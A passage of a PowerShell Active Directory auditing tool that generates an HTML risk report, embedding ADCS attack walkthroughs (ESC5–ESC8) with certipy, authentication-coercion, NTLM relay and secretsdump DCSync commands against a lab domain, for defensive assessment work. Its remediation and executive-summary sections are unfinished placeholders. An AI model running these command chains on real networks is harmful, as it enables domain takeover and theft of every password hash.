                                                <div class="attack-text">
                                                    <p>The certificate can be used with pass-the-cert to grant a user DCSync rights.</p>
                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nokey -out administrator.crt</p>                                                                                                                                                       
                                                    <p class="code">certipy cert -pfx administrator_forged.pfx -nocert -out administrator.key</p>                                                                                                                                                        
                                                    <p class="code">python3 /home/kali/Desktop/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target test -elevate -domain test.local -dc-ip 192.168.10.141</p>
                                                    
                                                    <p>With DCSync privileged granted the low-priivleged user can extract all password hashes from the domain.</p>    
                                                    <p class="code">impacket-secretsdump test:'Password123!'@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-6.png" alt="Exploiting ESC5">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC5 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif($finding.Technique -eq "ESC6"){
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $PKIhtml += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-riskcritical">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Certificate Authority has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set allowing low-privileged users to impersonate a domain admin.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">CA Name</td><td>$($finding."CAName")</td></tr>
                                            <tr><td class="grey">CA hostname</td><td>$($finding."CAhostname")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC6 is a vulnerability within ADCS where a Certificate Authority has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template's configuration, meaning any certificate that permits client authentication are vulnerable to ESC1 even if they do not allow a user to supply a SAN.</p>
                                            <p>This allows a low-privileged user to enroll in any authentication template supplying a SAN of Administrator, and then authenticate as the domain administrator.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC6-1.png" alt="Finding ESC6">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. Just as in ESC1, a low-privileged user can enroll in the certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template User -upn administrator@test.local -dns dc.test.local</p>
                                                             
                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC6-2.png" alt="Exploiting ESC6">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC6 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif($finding.Technique -eq "ESC7"){
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $PKIhtml += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-riskcritical">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user has Manage CA or Manage Certificate rights allowing impersonation of a domain admin.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">CA Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC7 is a vulnerability within ADCS where a low-privileged user has the ManageCA or Manage Certificate rights.</p>
                                            <p>This allows a low-privileged user to approve failed certificates requests, such ass failed ESC1 requests (allowing ESC1).</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.tarlogic.com/blog/ad-cs-esc7-attack/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy.</p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-1.png" alt="Finding ESC7">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. The SubCA template can be enabled on the CA with the -enable-template parameter.</p>
                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local -enable-template SubCA -u test@test.local -p 'Password123!'</p>

                                                    <p>A certificate based on the SubCA template can be requested like in ESC1. This request will be denied, but we will save the private key and note down the request ID.</p>
                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template SubCA -upn administrator@test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-2.png" alt="Exploiting ESC7">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. The failed certificate request can be issued with the ca command and the -issue-request <request ID> parameter.</p>
                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local -issue-request 57 -u test@test.local -p 'Password123!'</p>

                                                    <p>The issued certificate can then be retrieved with the req command.</p>
                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -retrieve 57</p>
                                                             
                                                    <p>The certificate can then be used with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-3.png" alt="Exploiting ESC7">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC7 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif($finding.Technique -eq "ESC8"){
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $PKIhtml += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-riskcritical">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate the identity of a domain controller via a 'NTLM relay' attack.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">CA Name</td><td>$($finding."CA Name")</td></tr>
                                            <tr><td class="grey">CA Endpoint</td><td>$($finding."CA Endpoint")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC8 is a vulnerability within ADCS where a certificate authority has the Web Enrollment service installed and is enabled via HTTP.
                                                The web enrollment interface ($($finding."CA Endpoint")) is vulnerable to 'NTLM relay' attacks. 
                                                    Without necessary protections, the web services endpoint can by-default be exploited to issue arbitrary certificates in the context of the coerced authentication (i.e. of a domain controller) to any low privileged user.</p>
                                            <p>This allows a low-privileged user to escalate to a domain controller and extract all user passwords from the domain.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain certificate authorities HTTP web services endpoints and see if they are lacking relaying protections using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-1.png"
                                                        alt="Finding ESC8">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can by default coerce machine authentication using RPC from the domain controller to an attacker controlled machine
                                                        (192.168.10.130) with printerbug.py or dfscoerce.py.
                                                    </p>
                                                    <p class="code">python3 printerbug.py test:'Password123'@192.168.10.141
                                                        192.168.10.130</p>
                                                    <p class="code">python3 dfscoerce.py -u test -p 'Password123!' -d test.local
                                                        192.168.10.130 192.168.18.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-2.png"
                                                        alt="Coercing authentication">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. The coerced authentication is then relayed to an unsecured certificate HTTP endpoint (e.g. http://192.168.10.142/certsrv/certfnsh.asp)
                                                         to enroll in the default "DomainController" certificate template under the context of the domain controller. This returns a pfx certificate as the domain controller.
                                                    </p>

                                                    <p class="code">python3 entry.py relay -target 'http://192.168.10.141' -template
                                                        DomainController</p>
                                                        <p>This authentication certificate can be used to obtain the ntlm hash for the domain controller.</p>
                                                    <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip 192.168.10.141</p>
                                                    <p> The ntlm hash can then be used to replicate the behavior of a domain
                                                        controller and obtain all the user password hashes within the domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
                                                        :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-3.png"
                                                        alt="Relaying authentication to ADCS web endpoint">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Enforce HTTPS & EPA, disable Kerberos or disable the endpoint</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
        }
        $PKIhtml += "</tbody></table></div>"
    }
    






















    # Kerberos
    if ($Scans -eq "Kerberos" -or $Scans -eq "All") {
        $Kerberos += Find-Kerberoast -Domain $Domain
        $Kerberos += Find-ASREProast -Domain $Domain
        $Kerberos += Find-Delegations -Domain $Domain
        $Kerberos += Find-GoldenTicket -Domain $Domain
    }
    if(!$Kerberos){
        $Kerberoshtml = @"
        <div class="finding-header">Kerberos</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    } else{
        $Kerberoshtml = @"
        <div class="finding-header">Kerberos</div>
"@
    }
   
    
    # ACLs
    if ($Scans -eq "ACLs" -or $Scans -eq "All") {
        $ACLs += Find-ACLs -Domain $Domain
    }
    if(!$ACLs){
        $ACLshtml = @"
        <div class="finding-header">ACLs</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    } else{
        $ACLshtml = @"
        <div class="finding-header">ACLs</div>
"@
    }


    # RBAC
    if ($Scans -eq "RBAC" -or $Scans -eq "All") {
        $RBAC += Find-PrivilegedGroups -Domain $Domain
        $RBAC += Find-AdminSDHolder -Domain $Domain
        $RBAC += Find-InactiveAccounts -Domain $Domain
        $RBAC += Find-AnonymousAccess -Domain $Domain
        $RBAC += Find-SensitiveAccounts -Domain $Domain
    }
    if(!$RBAC){
        $RBAChtml = @"
        <div class="finding-header">RBAC</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    } else{
        $RBAChtml = @"
        <div class="finding-header">RBAC</div>
"@
    }


    # Passwords
    if ($Scans -eq "PwdPolicy" -or $Scans -eq "All" ) {
        $Passwords += Find-PasswordPolicy -Domain $Domain
        $Passwords += Find-PwdNotRequired -Domain $Domain
        $Passwords += Find-LAPS -Domain $Domain
        $Passwords += Find-SensitiveInfo -Domain $Domain
        #$Passwords += Find-UserDescriptions -Domain $Domain -APIKey $APIkey
    }
    if(!$Passwords){
        $Passwordshtml = @"
        <div class="finding-header">Passwords</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    } else{
        $Passwordshtml = @"
        <div class="finding-header">Passwords</div>
"@
    }
    

    # MISC
    if ($Scans -eq "MISC" -or $Scans -eq "All") {
        $MISC += Find-MAQ -Domain $Domain
        $MISC += Find-OutboundAccess -Domain $Domain
        $MISC += Find-SMBSigning -Domain $Domain
        $MISC += Find-LDAPSigning -Domain $Domain
        $MISC += Find-Spooler -Domain $Domain
        $MISC += Find-WebDAV -Domain $Domain
        $MISC += Find-EfficiencyImprovements -Domain $Domain
    }
    if(!$MISC){
        $MISChtml = @"
        <div class="finding-header">MISC</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    } else{
        $MISChtml = @"
        <div class="finding-header">MISC</div>
"@
    }


    # Legacy
    if ($Scans -eq "Legacy" -or $Scans -eq "All") {
        $Legacy += Find-LegacyProtocols -Domain $Domain
        $Legacy += Find-UnsupportedOS -Domain $Domain
    }
    if(!$Legacy){
        $Legacyhtml = @"
        <div class="finding-header">Legacy</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    } else{
        $Legacyhtml = @"
        <div class="finding-header">Legacy</div>
"@
    }


    #Generate report
    Write-Host "$((Get-Date).ToString(""[HH:mm:ss tt]"")) Generating report..." -ForegroundColor Yellow
    if ($Scans -eq "All") {
        
        Write-Host @"
#####################################################################################
#                                   Run Info                                        #
##################################################################################### 
"@
        $endTime = Get-Date
        $elapsedTime = $endTime - $startTime
        $Runinfo = [PSCustomObject]@{
            "Domain Assessed" = $Domain
            "Ran as User"     = "$env:USERDOMAIN\$env:USERNAME"
            "Ran on Host"     = (Get-ADComputer -Identity $env:COMPUTERNAME).dnshostname
            "Date and Time"   = $startTime
            "Time to Run"     = $($elapsedTime.TotalSeconds)
        }
        $Runinfo | Format-List

        $runinfoHTML = @"
        <!-- Executive summary section -->
        <div class="summary">
        <!-- Left section for the tables -->
        <div class="left-section">
            <div class="table-container">
                <table class="summary-table">
                    <thead>
                        <tr>
                            <th colspan="2">Details when ran</th>
                        </tr>
                        <tr>
                            <td>Domain Assessed</td>
                            <td>$Domain</td>
                        </tr>
                        <tr>
                            <td>Ran as User</td>
                            <td>$env:USERDOMAIN\$env:USERNAME</td>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Ran on Host</td>
                            <td>$($(Get-ADComputer -Identity $env:COMPUTERNAME).dnshostname)</td>
                        </tr>
                        <tr>
                            <td>Date and Time</td>
                            <td>$startTime</td>
                        </tr>
                        <tr>
                            <td>Time to Run</td>
                            <td>$($elapsedTime.TotalSeconds)</td>
                        </tr>
                    </tbody>
                </table>
            </div>
"@

        Write-Host @"
#####################################################################################
#                          Risk Prioritisation Summary                              #
#####################################################################################
"@
        #Category of risks - array of hashtables
        $categoryVariables = @(
            @{Name = "Kerberos"; Variable = $Kerberos },
            @{Name = "PKI"; Variable = $PKI },
            @{Name = "RBAC"; Variable = $RBAC },
            @{Name = "ACLs"; Variable = $ACLs },
            @{Name = "Passwords"; Variable = $Passwords },
            @{Name = "MISC"; Variable = $MISC },
            @{Name = "Legacy"; Variable = $Legacy }
        )

        #Domain risk score
        foreach ($item in $categoryVariables) {
            $totaldomainriskscore += ($item.Variable | Measure-Object -Property Score -Sum).Sum
        } 
        $Domainrisk = [PSCustomObject]@{
            Category   = $Domain
            TotalScore = "$TotalDomainRiskScore / 100"
        }
        Write-Host "[*] Domain risk score:"
        $Domainrisk | Format-Table

        #Dynamically resolve risk image based on score
        $riskOverallHTML = @"
        <!-- Risk overall section -->
        <div class="risk-overall">
        <div class="left-image"> 
"@
        if ($TotalDomainRiskScore -ge 100){
            $riskOverallHTML += @"  
            <img src="./Images/Risk-scores/Critical.png" alt="Overall risk score">
            </div>
"@
        } elseif ($TotalDomainRiskScore -ge 75) {
            $riskOverallHTML += @"
            <img src="./Images/Risk-scores/High.png" alt="Overall risk score">
            </div>
"@
        } elseif ($TotalDomainRiskScore -ge 50) {
            $riskOverallHTML += @"
            <img src="./Images/Risk-scores/Medium.png" alt="Overall risk score">
            </div>
"@ 
        } elseif ($TotalDomainRiskScore -ge 25) {
            $riskOverallHTML += @"
            <img src="./Images/Risk-scores/Low.png" alt="Overall risk score">
            </div>
"@   
        } elseif ($TotalDomainRiskScore -eq 1) {
            $riskOverallHTML += @"
            <img src="./Images/Risk-scores/Very-low.png" alt="Overall risk score">
            </div> 
"@
        } elseif ($TotalDomainRiskScore -eq 0) {
            $riskOverallHTML += @"
            <img src="./Images/Risk-scores/Perfect.png" alt="Overall risk score">
            </div> 
"@   
        }
        #Risk level commentry
        $riskOverallHTML += @"
        <div class="risk-overall-text">
            <h1>Domain risk level: $TotalDomainRiskScore / 100</h1>
             <p>The maximum score is 100, anything above this presents a significant risk to ransomware.</p>
             <p>Attackers will always exploit the path of least resistance (higher scores) - low hanging fruit.</p>
             <a href="#category-summary">See score breakdown table</a>
        </div>
    </div>
"@


        #Category risk scores
        Write-Host "`r`n[*] Category Risk scores:"
        $categoryRisks += foreach ($item in $categoryVariables) {
            $score = ($item.Variable | Measure-Object -Property Score -Sum).Sum
            [PSCustomObject]@{
                Category = $item.Name
                Score    = $score
            }
        }
        $categoryRisks | Sort-Object -Property TotalScore -Descending

        $categoryRisksHTML = @"
        <div class="table-container">
                <table class="summary-table" id="category-summary">
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th>Risk Score</th>
                        </tr>
                    </thead>
                    <tbody>
"@
        foreach ($item in $categoryVariables) {
            $score = ($item.Variable | Measure-Object -Property Score -Sum).Sum
            if ($score -ge 100) {
                $categoryRisksHTML += @"
                <tr>
                    <td>$($item.Name)</td>
                    <td class="category-riskcritical">$score</td>
                </tr>
"@
            } elseif ($score -ge 75) {
                $categoryRisksHTML += @"
                <tr>
                    <td>$($item.Name)</td>
                    <td class="category-riskhigh">$score</td>
                </tr>
"@
            } elseif ($score -ge 50) {
                $categoryRisksHTML += @"
                <tr>
                    <td>$($item.Name)</td>
                    <td class="category-riskmedium">$score</td>
                </tr>
"@
            } elseif ($score -ge 1) {
                $categoryRisksHTML += @"
                <tr>
                    <td>$($item.Name)</td>
                    <td class="category-risklow">$score</td>
                </tr>
"@          
            } elseif ($score -eq 0) {
                $categoryRisksHTML += @"
                <tr>
                    <td>$($item.Name)</td>
                    <td class="category-riskinformational">$score</td>
                </tr>       
"@
            }
        }
        $categoryRisksHTML += @"
                    </tbody>
                </table>
            </div>
        </div>
"@


        #Ordered summary of risks
        $Risksummaries = "`r`n[*] Risk summaries:"
        $Allissues += $PKI + $Kerberos + $RBAC + $ACLs + $Passwords + $MISC + $Legacy

        #Add category to each issue
        $Allissues | ForEach-Object {
            try {
                if ($_ -in $PKI) {
                    $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "PKI"
                }
                elseif ($_ -in $Kerberos) {
                    $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "Kerberos"
                }
                elseif ($_ -in $RBAC) {
                    $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "RBAC"
                }
                elseif ($_ -in $ACLs) {
                    $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "ACLs"
                }
                elseif ($_ -in $Passwords) {
                    $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "Passwords"
                }
                elseif ($_ -in $Legacy) {
                    $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "Legacy"
                }
                elseif ($_ -in $MISC) {
                    $_ | Add-Member -NotePropertyName "Category" -NotePropertyValue "MISC"
                }
            
            }
            catch {}
        }
        $Risksummaries
        $AllissuesHTML = $Allissues | Where-Object { $null -ne $_.Score } | Select-Object Risk, Technique, Category, Score | Sort-Object -Property Score -Descending
        $AllissuesHTML | Format-Table


        #Define top of table
        $RisksummaryHTMLoutput = @"
        <!-- Risk prioritisation section -->
        <div class="risk-summary-container">
        <div class="risk-summary-heading">
            <h2>Risk Prioritisation Summary</h2>
            <p>The table below summarizes the number and severity of findings in order of decreasing risk. Full
                details can be found by clicking on each vulnerability which will take you to the relevant technical
                section.</p>
        </div>
        <table class="risk-prioritisation-summary">
            <thead>
                <tr>
                    <th class="risk-column">Risk</th>
                    <th class="technique-column">Issue</a></th>
                    <th class="category-column">Category</th>
                    <th class="score-column">Score</th>
                </tr>
            </thead>
            <tbody>
"@

        #Dynamically add rows to table based on risk
        foreach ($row in $AllissuesHTML) {
            $nospace = $row.Technique.Replace(" ", "-")
            if ($row.risk -match "CRITICAL") {
                #replace whitespace with - as HTML id's cannot have whitespace
                $RisksummaryHTMLoutput += @"
                <tr class="critical">
                    <td>Critical</td>
                    <td><a href="#$nospace">$($row.technique)</a></td>
                    <td>$($row.category)</td>
                    <td>$($row.score)</td>
                </tr>
"@
            }
            elseif ($row.risk -match "HIGH") {
                $RisksummaryHTMLoutput += @"
                <tr class="high">
                    <td>High</td>
                    <td><a href="#$nospace">$($row.technique)</a></td>
                    <td>$($row.category)</td>
                    <td>$($row.score)</td>
                </tr>
"@
            }
            elseif ($row.risk -match "MEDIUM") {
                $RisksummaryHTMLoutput += @"
                <tr class="medium">
                    <td>Medium</td>
                    <td><a href="#$nospace">$($row.technique)</a></td>
                    <td>$($row.category)</td>
                    <td>$($row.score)</td>
                </tr>
"@
            }
            elseif ($row.risk -match "LOW") {
                $RisksummaryHTMLoutput += @"
                <tr class="low">
                    <td>Low</td>
                    <td><a href="#$nospace">$($row.technique)</a></td>
                    <td>$($row.category)</td>
                    <td>$($row.score)</td>
                </tr>
"@
            }
            elseif ($row.risk -match "INFO") {
                $RisksummaryHTMLoutput += @"
                <tr class="information">
                    <td>Informational</td>
                    <td><a href="#$nospace">$($row.technique)</a></td>
                    <td>$($row.category)</td>
                    <td>$($row.score)</td>
                </tr>
"@
            }
        }
        #end the table
        $RisksummaryHTMLoutput += "</tbody></table></div>"
    }



    # $HTML = $AllissuesHTML | ConvertTo-Html -Fragment
    # $HTML = $HTML.Replace('<tr><td>CRITICAL</td><td>', '<tr class="critical"><td>Critical</td><td><a href="')
    
        
    # Output all findings in separate sections
    if ($Scans -eq "Info" -or $Scans -eq "All") {
        
        Write-Host @"
#####################################################################################
#                                    Domain Info                                    #
#####################################################################################
"@
        $DomainInfo | Format-List
    }

    if ($Scans -eq "ADCS" -or $Scans -eq "All") {

        Write-Host @"
#####################################################################################
#                                       PKI                                         #
#####################################################################################
"@
        $PKI | Format-List      #all 50 points and already in order
    }

    if ($Scans -eq "Kerberos" -or $Scans -eq "All") {
        Write-Host @"
#####################################################################################
#                                    Kerberos                                       #
#####################################################################################
"@
        $Kerberos | Sort-Object -Property Score -Descending | Format-List
    }    

    if ($Scans -eq "RBAC" -or $Scans -eq "All") {
        Write-Host @"
#####################################################################################
#                                       RBAC                                        #
#####################################################################################
"@
        $RBAC | Sort-Object -Property Score -Descending | Format-List
    }

    if ($Scans -eq "ACLs" -or $Scans -eq "All") {
        Write-Host @"
#####################################################################################
#                                       ACLs                                        #
#####################################################################################
"@
        $ACLs | Sort-Object -Property Score -Descending | Format-List
    }

    if ($Scans -eq "Passwords" -or $Scans -eq "All") {
        Write-Host @"
#####################################################################################
#                                     Passwords                                     #
#####################################################################################
"@
        $Passwords | Sort-Object -Property Score -Descending | Format-List
    }

    if ($Scans -eq "MISC" -or $Scans -eq "All") {
        Write-Host @"
#####################################################################################
#                                       MISC                                        #
#####################################################################################
"@
        $MISC | Sort-Object -Property Score -Descending | Format-List
    }

    if ($Scans -eq "Legacy" -or $Scans -eq "All") {
        Write-Host @"
#####################################################################################
#                                       LEGACY                                      #
#####################################################################################
"@
        $Legacy | Sort-Object -Property Score -Descending | Format-List
    }


    #wont output to screen in order as different ones take different amount of time, but when testing this is ok. real will save to variable for use in report

    #Attribute risk score - maybe have own file - attribute it here or elsewhere?
  
    # Caclulate-risk-score

    #Get generative AI input
    $executiveSummaryHTML = @"
    <!-- Right section for the executive summary -->
        <div class="executive-summary">
            <h2>Executive Summary (GPT to contextualize)</h2>
            <p>ADscanner was commissioned to perform a vulnerability assessment against the test.local Active Directory
                domain to ensure correct security configuration and operation of the Directory.
                The audit indicates that the security of the Active Directory is reduced by the X, Y & Z. a number of
                misconfigurations significantly increases the attack surface of Active Directory, and therefore the
                network could be exploited by a determined attacker deploying ransomware and malware.</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
            <p>ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...ChatGPT will fill the rest of this in...</p>
        </div>
    </div>
"@

    #Produce report
    #Generate-Report


    $htmlreportheader # banner and top heading
    $riskOverallHTML # domain risk level
    $runinfoHTML   # details when ran
    $categoryRisksHTML # category risk scores
    $executiveSummaryHTML # executive summary with GPT
    $RisksummaryHTMLoutput # risk prioritisation summary
    $DomainInfohtml # first bit of technical section

    #Technical sections
    $PKIhtml
    $Kerberoshtml
    $ACLshtml
    $RBAChtml
    $Passwordshtml
    $MISChtml
    $Legacyhtml

